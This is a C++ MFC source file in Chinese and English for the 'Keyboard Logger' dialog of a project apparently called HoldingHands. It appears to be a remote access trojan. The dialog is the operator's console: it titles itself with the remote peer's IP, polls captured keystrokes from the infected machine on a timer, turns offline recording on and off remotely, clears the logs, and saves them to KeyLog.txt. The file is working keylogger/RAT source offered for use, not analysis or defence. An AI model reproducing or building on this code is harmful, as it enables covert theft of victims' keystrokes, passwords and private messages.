// KeybdLogDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "KeybdLogDlg.h"
#include "afxdialogex.h"
#include "KeybdLogSrv.h"

// CKeybdLogDlg 对话框

IMPLEMENT_DYNAMIC(CKeybdLogDlg, CDialogEx)

CKeybdLogDlg::CKeybdLogDlg(CKeybdLogSrv*pHandler, CWnd* pParent /*=NULL*/)
	: CDialogEx(CKeybdLogDlg::IDD, pParent)
	, m_Interval(3),
	m_DestroyAfterDisconnect(FALSE),
	m_pHandler(pHandler),
	m_dwTimerId(0)
{
	m_pHandler->Get();
}

CKeybdLogDlg::~CKeybdLogDlg()
{
	m_pHandler->Put();
}

void CKeybdLogDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_Log);
	DDX_Text(pDX, IDC_EDIT2, m_Interval);
	DDX_Control(pDX, IDC_CHECK1, m_OfflineRecord);
}


BEGIN_MESSAGE_MAP(CKeybdLogDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_MESSAGE(WM_KEYBD_LOG_DATA,OnLogData)
	ON_MESSAGE(WM_KEYBD_LOG_ERROR, OnError)
	ON_MESSAGE(WM_KEYBD_LOG_INIT,OnLogInit)
	ON_BN_CLICKED(IDOK2, &CKeybdLogDlg::OnBnClickedOk2)
	ON_BN_CLICKED(IDOK, &CKeybdLogDlg::OnBnClickedOk)
	ON_EN_CHANGE(IDC_EDIT2, &CKeybdLogDlg::OnEnChangeEdit2)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_CHECK1, &CKeybdLogDlg::OnBnClickedCheck1)
	ON_BN_CLICKED(IDC_BUTTON1, &CKeybdLogDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CKeybdLogDlg 消息处理程序

void CKeybdLogDlg::PostNcDestroy()
{
	CDialogEx::PostNcDestroy();
	delete this;
}


void CKeybdLogDlg::OnClose()
{
	m_pHandler->SetNotifyWindow();
	m_pHandler->Close();
	DestroyWindow();
}

BOOL CKeybdLogDlg::OnInitDialog()
{
	char szIP[0x100];
	CDialogEx::OnInitDialog();
	
	//set window text...
	m_pHandler->GetPeerAddress(szIP);

	CString Title;
	CString ip(szIP);

	Title.Format(TEXT("[%s] Keyboard Logger"), ip);
	SetWindowText(Title);
	//
	m_OfflineRecord.EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT2)->EnableWindow(FALSE);
	GetDlgItem(IDOK2)->EnableWindow(FALSE);
	GetDlgItem(IDOK)->EnableWindow(FALSE);

	//set notify window..
	m_pHandler->SetNotifyWindow(GetSafeHwnd());
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常:  OCX 属性页应返回 FALSE
}

LRESULT CKeybdLogDlg::OnLogData(WPARAM wParam, LPARAM lParam)
{
	CHAR*szLog = (CHAR*)wParam;
	BOOL Append = lParam;
	if (!Append)
	{
		//清空。
		m_Log.SetWindowText(TEXT(""));
	}
	m_Log.SetSel(-1);
	m_Log.ReplaceSel(CString(szLog));
	return 0;
}


//保存日志
void CKeybdLogDlg::OnBnClickedOk2()
{
	//如果在这个函数内刚好连接断开会导致Server 崩溃.
	CFileDialog FileDlg(
		FALSE, 
		TEXT("*.txt"), 
		TEXT("KeyLog.txt"),
		OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, 
		TEXT("txt file(*.txt)|*.txt"),
		this
	);

	if (IDOK == FileDlg.DoModal())
	{
	
		HANDLE hFile = CreateFile(	
			FileDlg.GetPathName(), 
			GENERIC_WRITE,
			NULL,
			NULL, 
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		
		CString strErr = TEXT("Save Log success!");
		
		if (hFile == INVALID_HANDLE_VALUE)
		{
			strErr.Format(TEXT("CreateFile Failed With Error: %d"), GetLastError());
		}
		
		if (hFile != INVALID_HANDLE_VALUE)
		{
			DWORD dwWrite = 0;
			CString strLog;
			m_Log.GetWindowText(strLog);
			WriteFile(hFile, strLog.GetBuffer(), sizeof(TCHAR) * strLog.GetLength(), &dwWrite, NULL);
			CloseHandle(hFile);
		}
		MessageBox(strErr);
	}
}


//获取记录
void CKeybdLogDlg::OnBnClickedOk()
{
	m_pHandler->GetLogData();
}


void CKeybdLogDlg::OnCancel()
{
}


void CKeybdLogDlg::OnEnChangeEdit2()
{
	//重新设置时钟周期
	UpdateData();
	if (m_Interval == 0){
		return;
	}

	if (m_dwTimerId == 0x10086){
		KillTimer(m_dwTimerId);
		m_dwTimerId = 0;
		m_dwTimerId = SetTimer(0x10086, m_Interval * 1000, NULL);
	}
}


void CKeybdLogDlg::OnTimer(UINT_PTR nIDEvent)
{
	//
	m_pHandler->GetLogData();
	CDialogEx::OnTimer(nIDEvent);
}

LRESULT	CKeybdLogDlg::OnError(WPARAM wParam, LPARAM lParam)
{
	TCHAR *szError = (TCHAR*)wParam;
	MessageBox(szError, TEXT("Error"),MB_OK | MB_ICONINFORMATION);
	return 0;
}

LRESULT CKeybdLogDlg::OnLogInit(WPARAM wParam, LPARAM lParam)
{
	//设置 off line record 标记
	m_OfflineRecord.SetCheck(wParam);

	m_OfflineRecord.EnableWindow();
	GetDlgItem(IDC_EDIT2)->EnableWindow();
	GetDlgItem(IDOK2)->EnableWindow();
	GetDlgItem(IDOK)->EnableWindow();

	m_pHandler->GetLogData();
	//开始定时获取数据.
	m_dwTimerId = SetTimer(0x10086, m_Interval * 1000, NULL);
	return 0;
}

void CKeybdLogDlg::OnBnClickedCheck1()
{
	m_pHandler->SetOfflineRecord(m_OfflineRecord.GetCheck());
}



void CKeybdLogDlg::OnBnClickedButton1()
{
	m_Log.SetWindowText(TEXT(""));
	m_pHandler->CleanLog();
}




void CKeybdLogDlg::OnOK()
{
}
